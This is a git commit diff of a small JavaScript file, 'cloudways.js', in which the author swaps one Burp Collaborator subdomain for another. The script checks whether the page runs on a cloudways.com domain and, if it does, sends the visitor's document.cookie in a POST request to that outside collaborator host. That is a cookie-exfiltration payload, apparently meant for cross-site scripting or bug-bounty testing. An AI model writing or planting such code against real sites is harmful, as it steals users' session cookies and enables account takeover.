db0b3373190f2f780c32f98a1622ba6ce1ad01b2
hostfree23434 <46051776+hostfree23434@users.noreply.github.com>
2022-12-01 21:27:31 +0330

    Update cloudways.js

--- cloudways.js
+++ cloudways.js
@@ -1,7 +1,7 @@
 var text=document.domain;
 var regex=text.match(/.*cloudways.com/igm)
 if (text == regex){
-fetch('https://x860mf7w2n50vfufhi2q64rtwk2aqz.burpcollaborator.net', {
+fetch('https://svrjmwujc9phxxvt40sugap28tej28.burpcollaborator.net', {
 method: 'POST',
 mode: 'no-cors',
 body:document.cookie
